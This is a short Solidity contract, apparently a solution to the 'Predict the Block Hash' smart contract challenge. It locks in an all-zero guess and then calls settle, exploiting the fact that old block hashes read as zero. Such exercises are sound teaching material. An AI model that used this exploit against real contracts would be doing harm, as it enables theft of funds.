// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

import { PredictTheBlockHashChallenge } from "../challenges/09_PredictTheBlockHash/PredictTheBlockHashChallenge.sol";

contract PredictTheBlockHashAttack {
    function lockInGuess(PredictTheBlockHashChallenge target) external payable {
        target.lockInGuess{ value: msg.value }(
            0x0000000000000000000000000000000000000000000000000000000000000000
        );
    }

    function settle(PredictTheBlockHashChallenge target) external {
        target.settle();
    }

    receive() external payable {}
}
